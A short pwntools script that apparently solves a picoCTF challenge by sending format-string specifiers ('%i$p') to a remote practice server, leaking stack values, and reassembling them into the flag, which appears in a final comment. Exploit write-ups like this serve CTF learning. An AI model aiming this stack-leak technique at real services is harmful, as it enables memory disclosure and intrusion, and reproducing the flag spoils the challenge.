from pwn import *

context.log_level = 'info'

flag=""

# Lets fuzzx values
for i in range(36,46):
	try:
		# connect to server
		io = remote("saturn.picoctf.net",60316,level='warn')
		# io=process('./vuln',level='warn')
		# Format the counter
		# e.g %i$p will attempt to print [i]th pointer (or string/hex/char/int)
		io.sendline('%{}$p'.format(i).encode())
		# Recieve the response (leaked addresses followed by '.' in this case)
		io.recvuntil(b"Here's a story - ")
		result=io.recv()
		if not b'nil' in result:
			print(str(i) + ":" + str(result))
			try:
				# Decode, reverse endianess and print
				decoded = unhex(result.strip().decode()[2:])
				reversed_hex = decoded[::-1]
				print(str(reversed_hex))
				# Build the flag
				flag+=reversed_hex.decode()
			except BaseException:
				pass
		io.close()
	except EOFError:
		io.close()

# print flag
info(flag)
# picoCTF{L34k1ng_Fl4g_0ff_St4ck_eb9b46a2}
